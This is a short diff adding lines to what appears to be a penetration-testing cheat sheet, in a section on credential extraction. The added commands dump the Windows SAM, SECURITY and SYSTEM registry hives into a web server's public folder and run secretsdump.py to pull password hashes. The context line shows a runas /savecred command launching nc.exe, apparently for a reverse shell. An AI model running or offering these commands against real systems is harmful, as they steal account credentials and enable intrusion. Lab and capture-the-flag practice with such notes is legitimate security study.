@@ -199,8 +199,17 @@ runas /usr:ACCESS\Administrator /savecred "cmd /c C:\Users\security\Desktop\nc.e
 
 # Credential Extracting
 ```
+
+reg.exe save hklm\sam C:\xampp\htdocs\oscommerce-2.3.4\sam.save
+reg.exe save hklm\security C:\xampp\htdocs\oscommerce-2.3.4\security.save
+reg.exe save hklm\system C:\xampp\htdocs\oscommerce-2.3.4\system.save
+
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
 cd Windows/System32/config
 secretsdump.py LOCAL -system ./SYSTEM -sam ./SAM
+
+
 
 #cache files
 
